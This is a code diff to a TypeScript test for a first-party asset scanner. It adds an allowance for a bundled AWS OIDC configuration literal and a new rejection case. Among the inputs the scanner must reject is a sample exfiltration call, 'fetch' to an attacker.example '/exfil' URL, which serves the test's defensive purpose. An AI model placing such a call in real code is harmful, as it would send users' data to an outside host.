@@ -38,8 +38,14 @@ function assertFirstPartyOnly(text: string, label: string) {
       label.startsWith("/assets/") &&
       label.endsWith(".js") &&
       url === "https://react.dev/errors/`+e;if(1";
+    // AWS onboarding instructions embed an inert OIDC issuer and audience.
+    // Only tolerate the exact bundled configuration literal, not requests.
+    const awsOidcConfig =
+      label.startsWith("/assets/") &&
+      label.endsWith(".js") &&
+      url === "https://token.actions.githubusercontent.com`,audience:`sts.amazonaws.com`";
     assert.ok(
-      SAFE_URL.test(url) || reactErrorDecoder,
+      SAFE_URL.test(url) || reactErrorDecoder || awsOidcConfig,
       `${label} carries a third-party origin: ${url}`,
     );
   }
@@ -154,6 +160,7 @@ test("first-party asset scanner rejects executable third-party origins and other
   for (const text of [
     'fetch("https://attacker.example/exfil")',
     'fetch("https://react.dev/errors/123")',
+    'fetch("https://token.actions.githubusercontent.com")',
     'const image = "https://react.dev/another-path"',
     '<script src="https://react.dev/errors/123"></script>',
   ]) {
